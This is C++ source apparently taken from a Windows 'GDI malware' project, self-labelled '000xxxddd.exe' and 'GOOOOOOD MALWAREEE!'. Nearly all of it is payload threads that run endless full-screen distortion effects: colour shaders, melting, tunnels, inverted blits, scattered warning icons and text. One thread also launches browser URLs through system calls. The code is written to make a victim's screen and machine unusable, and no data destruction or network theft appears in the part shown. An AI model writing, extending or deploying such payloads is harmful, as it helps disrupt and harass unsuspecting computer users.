int RefreshScreen() {
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN); InvalidateRect(0, 0, 0);
    Sleep(1);
    return 114514;
}
VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 1000, rand() % 1000, rand() % 1000));
    SelectObject(hdc, hBrush);
    Rectangle(hdc, x, y, w + x, h + y);
    ReleaseDC(NULL, hdc);
    DeleteObject(hrgn);
}
DWORD WINAPI shader1(LPVOID lpParam) {
    srand(time(NULL));
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 50, 0 }; int count = 0, sss = rand() % 255;
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1), rgb = RGB(rand() % 255, rand() % 255, rand() % 255);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCPAINT);
        for (int x = 0; x < w; x += 35) {
            for (int y = 0; y < h; y += 35) {
                if (rand() % 8 != 1) {
                    StretchBlt(hcdc, x, y, 35, 35, hcdc, x, y, 30, 30, SRCAND);
                }
                else {
                    StretchBlt(hcdc, x, y, 35, 35, hcdc, x, y, 30, 30, SRCPAINT);
                };
            }
        }
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb += rgb - (((i % w) + (i / h) * sss) & 512);
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        if (count >= 15) { sss = rand() % 255; count = 0; }
        else { count++; }
        if (rand() % 15 == 14) { RefreshScreen(); Sleep(5); }
        Sleep(5);
    }
}
DWORD WINAPI stretchbltz(LPVOID lpParam) {
    int get = 2;
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            int bei = rand() % 2;

            if (bei == 1) {
                StretchBlt(hcdc, get, y, w, 1, hcdc, 0, y, w, 1, NOTSRCCOPY);
            }
            else {
                StretchBlt(hcdc, -get, y, w, 1, hcdc, 0, y, w, 1, NOTSRCCOPY);
            }
        }
        hdc = GetDC(0);
        HDC hcdc1 = CreateCompatibleDC(hdc);
        HBITMAP hBitmap1 = CreateCompatibleBitmap(hcdc, w, h);
        SelectObject(hcdc1, hBitmap1);
        BitBlt(hcdc1, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            int bei2 = rand() % 2;

            if (bei2 == 1) {
                StretchBlt(hcdc1, x, get, 1, h, hcdc1, x, 0, 1, h, NOTSRCCOPY);
            }
            else {
                StretchBlt(hcdc1, x, -get, 1, h, hcdc1, x, 0, 1, h, NOTSRCCOPY);
            }
        }

        BitBlt(hdc, 0, 0, w, h, hcdc1, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteDC(hcdc);
        DeleteDC(hcdc1);
        DeleteObject(hcdc);
        DeleteObject(hcdc1);
        DeleteObject(hBitmap);
        DeleteObject(hBitmap1);
        Sleep(150);
    }
    return 0;
}
DWORD WINAPI shader2(LPVOID lpParam) {
    int xxx = 0;
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = h;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            int code = i + (x * y);
            rgbScreen[i].rgb = y / 2 << (code * xxx / 256);
        }
        xxx++;
        BLENDFUNCTION blur;
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 150;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}
DWORD WINAPI ccccccccccccccccircle(LPVOID lpvd) {//by pankoza
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int xf = 0;
    int yf = 0;
    int signX = 15;
    int signY = 5;
    HDC hdc = GetDC(0);
    HBITMAP hbmTemp = CreateCompatibleBitmap(hdc, w, h);
    HDC hdcTemp = CreateCompatibleDC(hdc);
    HBRUSH hbr = CreateSolidBrush(RGB(225, 0, 0));
    SelectObject(hdcTemp, hbmTemp);
    int radius = 100.0f;
    double angle = 0;
    int x, y;
    int centerX, centerY;
    int origX = (w / 4) - (radius / 2), origY = (h / 4) - (radius / 2);
    while (true)
    {
        hdc = GetDC(0);
        xf += signX;
        yf += signY;
        centerX = origX - (w / 4), centerY = origY - (h / 4);
        x = (cos(angle) * radius) + centerX, y = (sin(angle) * radius) + centerY;

        for (INT i = 64; i > 8; i -= 8)
        {
            hbr = CreateSolidBrush(RGB(255, 128, 4));
            SelectObject(hdc, hbr);
            Ellipse(hdc, 50 + x - i + xf, 50 + y - i + yf, 100 + x + i + xf, 100 + y + i + yf);
            DeleteObject(hbr);
        }

        angle = fmod(angle + PI / radius, PI * radius);
        Sleep(10);

        if (yf == 0)
        {
            signY = 5;
        }

        if (xf == 0)
        {
            signX = 15;
        }

        if (yf >= GetSystemMetrics(1))
        {
            signY -= 5;
        }

        if (xf >= GetSystemMetrics(0))
        {
            signX -= 15;
        }
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI shader3(LPVOID lpParam) {
    srand(time(NULL));
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 100, 0 };
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        PRGBQUAD rgbScreen = { 0 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        for (int i = 0; i < w * h; i++) {
            int luckynum = rand() % 30;
            if (luckynum <= 10) { rgbScreen[i].rgb = 0; }
            else if (luckynum > 10 && luckynum <= 20) { rgbScreen[i].rgb = 7237230; }
            else { rgbScreen[i].rgb = 14474460; }
        }
        for (int x = 0; x < w; x += 50) {
            for (int y = 0; y < h; y += 50) {
                StretchBlt(hcdc, x, y, 50, 50, hcdc, x, y, 15, 15, NOTSRCCOPY);
            }
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
}
DWORD WINAPI meltin9(LPVOID lpParam)
{
    while (1)
    {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
        HDC hdcTemp = CreateCompatibleDC(hdc);
        HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
        BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int numShifts = 600;
        for (int i = 0; i < numShifts; i++)
        {
            int x = rand() % w;
            int y = rand() % h;
            int dx = (rand() % 3) - 1;
            int dy = (rand() % 3) - 1;
            BitBlt(hdcTemp, x + dx, y + dy, w - x, h - y, hdcTemp, x, y, SRCINVERT);
        }
        BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCPAINT);
        SelectObject(hdcTemp, hbmOld);
        DeleteDC(hdcTemp);
        DeleteObject(hbm);
        ReleaseDC(NULL, hdc);
    }
}
DWORD WINAPI shader4(LPVOID lpParam) {
    srand(time(NULL));
    HDC hdc = GetDC(0);
    HDC hcdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hcdc, hbmTemp);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            rgbScreen[i].rgb = (rgbScreen[i].rgb * 3) % (RGB(120, 120, 120));
        }

        int randrand = (rand() % 80) + 30;
        if (rand() % 2 != 1) {
            BitBlt(hcdc, 0, 0, w, h, hcdc, -randrand, 0, NOTSRCCOPY);
            BitBlt(hcdc, 0, 0, w, h, hcdc, w - randrand, 0, SRCPAINT);
        }
        else {
            BitBlt(hcdc, 0, 0, w, h, hcdc, 0, -randrand, NOTSRCCOPY);
            BitBlt(hcdc, 0, 0, w, h, hcdc, 0, h - randrand, SRCAND);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
}
DWORD WINAPI circlez(LPVOID lpParam) {
    RECT rect;
    HDC hdc = GetDC(NULL);
    GetWindowRect(GetDesktopWindow(), &rect);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
    ReleaseDC(0, hdc);
    int a = 11;
    for (int t = 0;; t++)
    {
        int b = rand() % a;
        const int size = b * 100 * wdpi / 96;
        int w = GetSystemMetrics(SM_CXSCREEN) - (b * 50 * wdpi / 96), h = GetSystemMetrics(SM_CYSCREEN) - (b * 50 * hdpi / 96);
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

        for (int i = 0; i < size; i += (100 * wdpi / 96))
        {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(25);
        }
    }
}
DWORD WINAPI shader4num1(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        StretchBlt(hcdc, 0, 0, w / 2, h / 2, hdc, 0, 0, w, h, NOTSRCCOPY);
        StretchBlt(hcdc, w / 2, 0, w / 2, h / 2, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, 0, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, NOTSRCCOPY);
        StretchBlt(hcdc, w / 2, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(500);
    }
}
DWORD WINAPI shader5(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int fx = (int)((4 * i) + ((4 * i) * tan(x / 16.0)) + (4 * i) + ((4 * i) * tan(y / 8.0)));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }

    return 0x00;
}
DWORD WINAPI shader6(LPVOID lpvd)//from N17Pro3426, but i modified
{
    HDC dc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(dc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(dcCopy, bmp);

    INT i = 0;

    while (1)
    {
        StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int j = 4 * i;

                int fx = (int)(j + (j * tan(x / 16.0)) + j + (j * tan(y / 8.0)) + j + (j * tan((x + y) / 16.0)) + j + (j * tan(sqrt((double)(x * x + y * y)) / 8.0))) / 2;

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCINVERT);
    }

    return 0x00;
}
DWORD WINAPI Tunnel(LPVOID lpParam) {
    HDC hWindow;
    HDC hDsktp;
    HWND hWnd;
    RECT wRect;
    int dX = 0;
    int dY = 0;
    int dW;
    int dH;
    POINT wPt[3];
    int counter = 30;
    system("start https://github.com/MazeIcon/");
    system("start https://commons.wikimedia.org/w/index.php?title=User%3ATobascoc1&action=edit&section=0");
    for (;;)
    {

        hWnd = GetDesktopWindow();
        hWindow = GetWindowDC(hWnd);
        hDsktp = GetDC(0);
        GetWindowRect(hWnd, &wRect);

        dW = GetSystemMetrics(0);
        dH = GetSystemMetrics(0);

        wPt[0].x = wRect.left + counter;
        wPt[0].y = wRect.top + counter;
        wPt[1].x = wRect.right - counter;
        wPt[1].y = wRect.top;
        wPt[2].x = wRect.left + counter;
        wPt[2].y = wRect.bottom - counter;

        PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
    }
}
DWORD WINAPI idk(LPVOID lpParam) {
    HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    for (;;) {
        hdc = GetDC(0);
        for (float i = 0; i < sw + sh; i += 0.99f) {
            int a = sqrt(angle) * 50;
            BitBlt(hdc, 0, i, sw, 1, hdc, a, i, NOTSRCCOPY);
            angle += PI / 60;
            DeleteObject(&a); DeleteObject(&i);
        }
        if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
        ReleaseDC(wnd, hdc);
        DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
    }
}
DWORD WINAPI g1itch(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int size = 500;
    while (1) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCINVERT);
        for (int i = 0; i < 60; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCINVERT);
        }
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 80, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blend);
        ReleaseDC(0, hdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
    }
    return 0;
}
DWORD WINAPI specialtunnel(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 1000, rand() % 1000, rand() % 1000));
        SelectObject(hdc, brush);
        SetStretchBltMode(hdc, HALFTONE);
        StretchBlt(hdc, rand() % 10, rand() % 10, x - 20, y - 20, hdc, 0, 0, x, y, 0x1900ac010e);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI texts(LPVOID lpParam) {//by pankoza, but i modified
    LPCSTR texts[5] = { "000xxxddd.exe (NO SKIDDED)", "Made By MazeIcon & Jeremiah", "no SkID", "GOOOOOOD MALWAREEE!", "NO SKIDDED!, NO SKIDDER!"};
    while (true) {
        int rdx = 1 + rand() % 3; int xxx = (rdx * 10) - 10;
        int tmp = rand() % 5, color = RGB(rand() % 255, rand() % 255, rand() % 255);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        SetTextColor(hdc, color);
        HFONT font = CreateFontA(50, 30, rand() % 100, rand() % 100, FW_DONTCARE, 0, 0, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "Comic Sans MS");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % w, rand() % h, texts[tmp], strlen(texts[tmp]));
        ReleaseDC(0, hdc);
        DeleteObject(font);
        DeleteDC(hdc);
        Sleep(25);
    }
}
DWORD WINAPI shitfuck(LPVOID lpParam) {
    while (1)
    {
        int x = 1920;
        int y = 1080;
        auto hdc = GetWindowDC(GetDesktopWindow());
        HDC desk;
        RECT wRect;
        POINT wPt[3];
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
        HBITMAP screenshot = CreateCompatibleBitmap(desk, xs, ys);
        SelectObject(deskMem, screenshot);
        GetWindowRect(GetDesktopWindow(), &wRect);
        wPt[0].x = wRect.left - 19;
        wPt[0].y = wRect.top + 90;
        wPt[1].x = wRect.right - 10;
        wPt[1].y = wRect.top - 18;
        wPt[2].x = wRect.left + 70;
        wPt[2].y = wRect.bottom + 90;
        PlgBlt(deskMem, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_WARNING));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_QUESTION));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_INFORMATION));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_ERROR));
        BitBlt(desk, 0, 0, xs, ys, deskMem, 0, 0, SRCERASE);
        DeleteDC(desk);
        DeleteObject(screenshot);
        if (rand() % 10 == 4) InvalidateRect(0, 0, 0);
    }
}
DWORD WINAPI shader7(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            int t = 114;
            rgbScreen[i].rgb = (t * i) % (Hue(239));
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, NOTSRCERASE);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}
DWORD WINAPI enlarge(LPVOID lpParam) {
    HDC desk;
    int sw, sh;
    while (true) {
        desk = GetDC(0);
        sw = GetSystemMetrics(0);
        sh = GetSystemMetrics(1);
        StretchBlt(desk, -20, -20, sw + 40, sh + 40, desk, 0, 0, sw, sh, NOTSRCCOPY);
        ReleaseDC(0, desk);
        Sleep(4);
    }
}
DWORD WINAPI shader8(LPVOID lpParam) {
    srand(time(NULL));
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rnd = rand() % 360, rndsize = 1 + rand() % (h / 2);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = ((x ^ y) + (i * 2) + rnd + (i * 10));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h += fmod(fx / 200, 1.f);
                hslcolor.s += 1.f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int yyy = 0; yyy < h; yyy += rndsize) {
            StretchBlt(hcdc, -2 + rand() % 5, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCERASE);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); i++;
    }
}
DWORD WINAPI shader9(LPVOID lpParam) {
    PRGBTRIPLE rgbtriple; int xxx = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 40, w, h, 1, 24 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w, t = (x | y);
            rgbtriple[i].rgbtRed += t + x + xxx;
            rgbtriple[i].rgbtGreen += t + i + xxx;
            rgbtriple[i].rgbtBlue += t + y + xxx;
        }
        for (int y = 0; y < h; y++) {
            StretchBlt(hcdc, -2 + rand() % 5, y, w, 1, hcdc, 0, y, w, 1, SRCPAINT);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); xxx += 2;
    }
    return 0;
}
DWORD WINAPI shader10(LPVOID lpParam) {
    int get = 1;
    int getmod = 1;
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            int bei = rand() % 2;

            if (bei == 1) {
                StretchBlt(hcdc, get, y, w, 1, hcdc, 0, y, w, 1, NOTSRCCOPY);
            }
            else {
                StretchBlt(hcdc, -get, y, w, 1, hcdc, 0, y, w, 1, SRCAND);
            }
        }
        hdc = GetDC(0);
        HDC hcdc1 = CreateCompatibleDC(hdc);
        HBITMAP hBitmap1 = CreateCompatibleBitmap(hcdc, w, h);
        SelectObject(hcdc1, hBitmap1);
        BitBlt(hcdc1, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            int bei2 = rand() % 2;

            if (bei2 == 1) {
                StretchBlt(hcdc1, x, get, 1, h, hcdc1, x, 0, 1, h, SRCERASE);
            }
            else {
                StretchBlt(hcdc1, x, -get, 1, h, hcdc1, x, 0, 1, h, NOTSRCCOPY);
            }
        }

        BitBlt(hdc, 0, 0, w, h, hcdc1, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc);
        DeleteDC(hcdc);
        DeleteDC(hcdc1);
        DeleteObject(hcdc);
        DeleteObject(hcdc1);
        DeleteObject(hBitmap);
        DeleteObject(hBitmap1);
        if (get > 40) {
            getmod = 2;
        }
        else if (get == 1 && getmod == 2) {
            getmod = 1;
        }

        if (getmod == 1) {
            get += 1;
        }
        else {
            get -= 1;
        }
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI shader11(LPVOID lpParam) {
    srand(time(NULL));
    int xxx = 0; BLENDFUNCTION blur = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbScreen[i].rgb += (((x * i) + xxx) * ((y * i) + xxx));
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); xxx++;
    }
}
DWORD WINAPI freeeeeeeeeeeeeze(LPVOID lpParam) {
    int count = 1;
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        SetStretchBltMode(hcdc, 4);
        StretchBlt(hcdc, 0, 0, w + count, h - count, hcdc, 0, 0, w, h, NOTSRCCOPY);
        StretchBlt(hcdc, 0, 0, w - count, h + count, hcdc, 0, 0, w, h, NOTSRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteDC(hcdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        count += 1;
        if (count > 25) {
            count = 1;
        }
        Sleep(1);
    }
    return 0;
}
